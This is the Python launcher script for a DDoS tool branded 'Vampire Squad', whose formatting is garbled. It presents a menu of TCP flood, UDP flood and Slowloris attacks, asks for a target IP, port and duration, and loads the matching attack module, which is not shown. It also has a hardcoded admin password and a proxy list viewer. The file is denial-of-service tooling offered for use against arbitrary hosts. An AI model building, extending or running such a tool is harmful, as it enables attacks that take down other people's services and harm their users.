vampire_ddos_x.py

import os import sys import time import importlib import threading from colorama import Fore, Style, init

init(autoreset=True)

--------------------------- CONFIG ---------------------------

ADMIN_PASSWORD = "vampire@root" MODULES = { "TCP Flood": "attacks.tcp", "UDP Flood": "attacks.udp", "Slowloris": "attacks.slowloris" }

------------------------ UTILITIES ---------------------------

def clear(): os.system('cls' if os.name == 'nt' else 'clear')

def check_dependencies(): try: import requests except: os.system("pip install requests") try: import colorama except: os.system("pip install colorama")

def banner(): clear() print(Fore.RED + Style.BRIGHT + f""" ██╗   ██╗ █████╗ ███╗   ███╗██████╗ ██╗██████╗ ███████╗ ██║   ██║██╔══██╗████╗ ████║██╔══██╗██║██╔══██╗██╔════╝ ██║   ██║███████║██╔████╔██║██████╔╝██║██║  ██║█████╗
██║   ██║██╔══██║██║╚██╔╝██║██╔═══╝ ██║██║  ██║██╔══╝
╚██████╔╝██║  ██║██║ ╚═╝ ██║██║     ██║██████╔╝███████╗ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚═════╝ ╚══════╝ {Fore.YELLOW}Powerful DDoS Tool by Vampire Squad """ + Style.RESET_ALL)

def auto_fix_structure(): required_dirs = ["logs", "proxies", "attacks"] required_files = { "proxies/proxy.txt": "", "proxies/working_proxies.txt": "", "logs/.keep": "", } for d in required_dirs: os.makedirs(d, exist_ok=True) for f, content in required_files.items(): if not os.path.exists(f): with open(f, 'w') as fp: fp.write(content)

def get_input(prompt): try: return input(prompt) except KeyboardInterrupt: print("\n[!] Interrupted.") sys.exit(0)

------------------------ MAIN MENU ---------------------------

def attack_menu(): print(Fore.CYAN + "\nAvailable Attacks:") for idx, key in enumerate(MODULES.keys(), start=1): print(f"  {idx}. {key}") print("  0. Exit")

choice = get_input(Fore.YELLOW + "\nSelect Attack [0-9]: ")
if choice == '0':
    sys.exit(0)

try:
    idx = int(choice) - 1
    attack_name = list(MODULES.keys())[idx]
    module_path = MODULES[attack_name]
    module = importlib.import_module(module_path)

    ip = get_input(Fore.GREEN + "Target IP: ")
    port = int(get_input("Target Port: "))
    duration = int(get_input("Duration (in seconds): "))

    thread = threading.Thread(target=module.__dict__[module_path.split('.')[-1] + '_attack'], args=(ip, port, duration))
    thread.start()
    thread.join()

except (IndexError, ValueError):
    print(Fore.RED + "Invalid input!")
except Exception as e:
    print(Fore.RED + f"Error: {e}")

time.sleep(2)
main()

---------------------- ADMIN MODE -----------------------------

def admin_login(): pw = get_input(Fore.MAGENTA + "Enter Admin Password: ") if pw == ADMIN_PASSWORD: print(Fore.GREEN + "Access Granted! Welcome Admin.") advanced_dashboard() else: print(Fore.RED + "Access Denied!") time.sleep(2) main()

def advanced_dashboard(): while True: print(Fore.BLUE + "\n[Admin Dashboard] Select Option:") print("  1. Launch Attack") print("  2. View Working Proxies") print("  3. Exit") ch = get_input("Choice: ")

if ch == '1':
        attack_menu()
    elif ch == '2':
        try:
            with open("proxies/working_proxies.txt") as f:
                print(Fore.GREEN + f.read())
        except:
            print(Fore.RED + "No working proxies found!")
    elif ch == '3':
        sys.exit(0)
    else:
        print(Fore.RED + "Invalid choice.")

--------------------------- MAIN ------------------------------

def main(): banner() auto_fix_structure() check_dependencies() print(Fore.YELLOW + "\nModes:") print("  1. Admin (Password Protected)") print("  2. Public (No Password)")

mode = get_input("\nChoose Mode [1/2]: ")
if mode == '1':
    admin_login()
elif mode == '2':
    attack_menu()
else:
    print(Fore.RED + "Invalid selection.")
    time.sleep(1)
    main()

if name == "main": main()
